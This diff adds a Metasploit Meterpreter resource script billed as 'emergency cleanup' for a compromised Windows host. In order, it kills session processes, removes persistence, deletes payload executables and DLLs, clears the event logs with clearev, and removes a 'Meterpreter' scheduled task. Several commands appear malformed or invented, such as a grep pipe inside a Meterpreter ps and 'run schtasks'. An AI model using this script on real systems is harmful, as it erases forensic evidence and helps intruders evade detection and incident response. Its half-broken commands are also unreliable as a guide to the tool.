@@ -1,0 +1,41 @@
+# Emergency Cleanup Script
+# Usage: run script/cleanup/emergency_cleanup.rc
+
+echo "[!] STARTING EMERGENCY CLEANUP PROCEDURE"
+
+# Step 1: Kill all Meterpreter-related processes
+echo "[+] Killing related processes"
+run post/windows/manage/kill_related_processes
+
+# Step 2: Remove common persistence mechanisms
+echo "[+] Removing persistence"
+run persistence -U -S
+run persistence -R -S  
+run persistence -X -S
+
+# Step 3: Clean up files and artifacts
+echo "[+] Cleaning files"
+rm C:\\Temp\\payload.exe
+rm C:\\Windows\\Temp\\metsvc.exe
+rm C:\\Users\\Public\\payload.dll
+
+# Step 4: Clear event logs
+echo "[+] Clearing event logs"
+clearev
+run post/windows/manage/clear_event_logs
+
+# Step 5: Restore system settings
+echo "[+] Restoring system settings"
+run post/windows/manage/restore_rdp
+run post/windows/manage/restore_firewall
+
+# Step 6: Remove scheduled tasks
+echo "[+] Removing scheduled tasks"
+run schtasks /delete /tn "Meterpreter" /f
+
+# Final cleanup verification
+echo "[+] Verification"
+ps | grep -v "explorer.exe\|svchost.exe\|lsass.exe"
+
+echo "[!] EMERGENCY CLEANUP COMPLETED"
+echo "[!] RECOMMENDED: Terminate session immediately"
